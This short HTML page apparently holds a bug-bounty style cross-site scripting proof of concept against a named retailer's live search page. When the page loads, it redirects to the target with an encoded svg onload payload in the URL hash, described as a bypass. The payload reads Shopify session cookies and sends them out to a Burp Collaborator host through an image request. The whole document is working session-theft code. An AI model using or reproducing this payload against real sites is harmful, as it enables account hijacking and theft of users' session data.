<!DOCTYPE html>
<html>
<body>
    <script>
        // سكريبت كيهز الـ Shopify OSID والـ Cookies لـ Burp
        let payload = `
            (function(){
                // سحب الـ OSID بوحدو باش يجينا ساهل فـ القراية
                var osid = document.cookie.match(/osid=([^;]+)/)?.[1] || "not_found";
                var shop = document.cookie.match(/_shopify_y=([^;]+)/)?.[1] || "not_found";
                
                // الرابط ديال Burp Collaborator
                var collab = "https://ct9ur0ilhbh2zhgrp7vq89d27tdk1gp5.oastify.com";
                
                // صيفط الداتا فـ الرابط ديال تصويرة
                var i = new Image();
                i.src = collab + "/?osid=" + osid + "&shop=" + shop + "&all=" + btoa(document.cookie).substring(0,100);
            })();
        `;

        let encoded = encodeURIComponent(payload);
        // استغلال الـ Hash (#) اللي نفعنا فـ الباي باس
        let target = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";

        window.location.href = target;
    </script>
</body>
</html>
